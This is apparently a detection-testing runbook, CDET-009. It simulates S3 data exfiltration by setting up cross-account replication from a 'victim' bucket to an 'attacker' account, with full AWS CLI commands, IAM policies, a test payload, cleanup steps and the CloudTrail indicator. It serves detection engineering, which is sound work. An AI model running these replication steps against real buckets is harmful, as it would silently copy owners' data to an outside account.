# CDET-009 — Simulation Steps: S3 Replication to External Account

**WARNING**: These steps configure S3 replication to an external account. Use only in isolated test environments. Running against production buckets will result in real data being copied to the destination account.

---

## Prerequisites

- AWS CLI configured for the **source (victim) account**
- A second AWS account to act as the destination (attacker account)
- Source bucket with versioning enabled (replication requires versioning)
- IAM permissions: `s3:PutReplicationConfiguration`, `iam:CreateRole`, `iam:PutRolePolicy`

---

## Phase 1: Prepare the Source Account (Victim)

### Step 1a: Create or identify the source bucket

```bash
# Create a test source bucket if needed
SOURCE_BUCKET="cdet009-test-source-$(date +%s)"
SOURCE_ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
REGION="us-east-1"

aws s3api create-bucket \
  --bucket "$SOURCE_BUCKET" \
  --region "$REGION"

# Enable versioning (required for replication)
aws s3api put-bucket-versioning \
  --bucket "$SOURCE_BUCKET" \
  --versioning-configuration Status=Enabled

echo "Source bucket: $SOURCE_BUCKET in account $SOURCE_ACCOUNT"
```

### Step 1b: Create the IAM replication role

```bash
# Create trust policy allowing S3 service to assume this role
cat > /tmp/s3-replication-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "Service": "s3.amazonaws.com"
    },
    "Action": "sts:AssumeRole"
  }]
}
EOF

# Create the replication role
aws iam create-role \
  --role-name cdet009-replication-role \
  --assume-role-policy-document file:///tmp/s3-replication-trust.json

REPLICATION_ROLE_ARN=$(aws iam get-role \
  --role-name cdet009-replication-role \
  --query Role.Arn --output text)

echo "Replication role ARN: $REPLICATION_ROLE_ARN"
```

### Step 1c: Attach permissions policy to the replication role

```bash
# Replace DEST_ACCOUNT and DEST_BUCKET with your attacker account values
DEST_ACCOUNT="999999999999"  # attacker account ID
DEST_BUCKET="cdet009-test-dest"

cat > /tmp/s3-replication-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObjectVersionForReplication",
        "s3:GetObjectVersionAcl",
        "s3:GetObjectVersionTagging"
      ],
      "Resource": "arn:aws:s3:::${SOURCE_BUCKET}/*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:ListBucket",
        "s3:GetReplicationConfiguration"
      ],
      "Resource": "arn:aws:s3:::${SOURCE_BUCKET}"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:ReplicateObject",
        "s3:ReplicateDelete",
        "s3:ReplicateTags"
      ],
      "Resource": "arn:aws:s3:::${DEST_BUCKET}/*"
    }
  ]
}
EOF

aws iam put-role-policy \
  --role-name cdet009-replication-role \
  --policy-name s3-replication-permissions \
  --policy-document file:///tmp/s3-replication-policy.json
```

---

## Phase 2: Prepare the Destination Account (Attacker)

**Switch to the attacker account credentials for this phase.**

```bash
# Create the destination bucket
DEST_BUCKET="cdet009-test-dest-$(date +%s)"
DEST_REGION="us-west-2"  # different region simulates real exfiltration

aws s3api create-bucket \
  --bucket "$DEST_BUCKET" \
  --region "$DEST_REGION" \
  --create-bucket-configuration LocationConstraint=$DEST_REGION

# Enable versioning on destination (required)
aws s3api put-bucket-versioning \
  --bucket "$DEST_BUCKET" \
  --versioning-configuration Status=Enabled
```

### Destination bucket policy — grants replication permission to source account

```bash
# Replace SOURCE_ACCOUNT and REPLICATION_ROLE_ARN with victim account values
cat > /tmp/dest-bucket-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowReplicationFromVictimAccount",
      "Effect": "Allow",
      "Principal": {
        "AWS": "${REPLICATION_ROLE_ARN}"
      },
      "Action": [
        "s3:ReplicateObject",
        "s3:ReplicateDelete",
        "s3:ReplicateTags",
        "s3:ObjectOwnerOverrideToBucketOwner"
      ],
      "Resource": "arn:aws:s3:::${DEST_BUCKET}/*"
    },
    {
      "Sid": "AllowVersioningCheck",
      "Effect": "Allow",
      "Principal": {
        "AWS": "${REPLICATION_ROLE_ARN}"
      },
      "Action": [
        "s3:List*",
        "s3:GetBucketVersioning",
        "s3:PutBucketVersioning"
      ],
      "Resource": "arn:aws:s3:::${DEST_BUCKET}"
    }
  ]
}
EOF

aws s3api put-bucket-policy \
  --bucket "$DEST_BUCKET" \
  --policy file:///tmp/dest-bucket-policy.json
```

---

## Phase 3: Configure Replication on Source Bucket

**Switch back to the victim account credentials.**

This is the **detection point** — this single API call generates the `PutBucketReplication` CloudTrail event.

```bash
# The full replication configuration JSON
cat > /tmp/replication-config.json << EOF
{
  "Role": "${REPLICATION_ROLE_ARN}",
  "Rules": [
    {
      "ID": "replicate-all-to-external",
      "Status": "Enabled",
      "Filter": {
        "Prefix": ""
      },
      "Destination": {
        "Bucket": "arn:aws:s3:::${DEST_BUCKET}",
        "Account": "${DEST_ACCOUNT}",
        "AccessControlTranslation": {
          "Owner": "Destination"
        }
      },
      "DeleteMarkerReplication": {
        "Status": "Enabled"
      }
    }
  ]
}
EOF

# THE DETECTION EVENT — this triggers CDET-009
aws s3api put-bucket-replication \
  --bucket "$SOURCE_BUCKET" \
  --replication-configuration file:///tmp/replication-config.json

echo "Replication configured. All future objects in $SOURCE_BUCKET will be copied to $DEST_BUCKET in account $DEST_ACCOUNT"
```

---

## Phase 4: Verify Replication (Optional Testing)

```bash
# Write a test object to trigger replication
echo "This is a test exfiltration payload" | \
  aws s3 cp - "s3://${SOURCE_BUCKET}/test-object.txt"

# Verify the object appears in the destination bucket (attacker account)
# Switch to attacker account credentials
aws s3api get-object \
  --bucket "$DEST_BUCKET" \
  --key "test-object.txt" \
  /tmp/replicated-object.txt
```

---

## Cleanup (Victim Account)

```bash
# Remove replication configuration
aws s3api delete-bucket-replication --bucket "$SOURCE_BUCKET"

# Remove replication role
aws iam delete-role-policy \
  --role-name cdet009-replication-role \
  --policy-name s3-replication-permissions

aws iam delete-role --role-name cdet009-replication-role

# Delete test objects and bucket (optional)
aws s3 rm "s3://${SOURCE_BUCKET}" --recursive
aws s3api delete-bucket --bucket "$SOURCE_BUCKET"
```

---

## Key Field in PutBucketReplication Event

The `replicationConfiguration.rules[].destination.bucket` field in the CloudTrail event contains the destination bucket ARN. Cross-account replication is identifiable by comparing the account ID in this ARN against the source account ID.

**Indicator**: `destination.bucket` = `arn:aws:s3:::BUCKET` where the `destination.account` field contains a different AWS account ID.
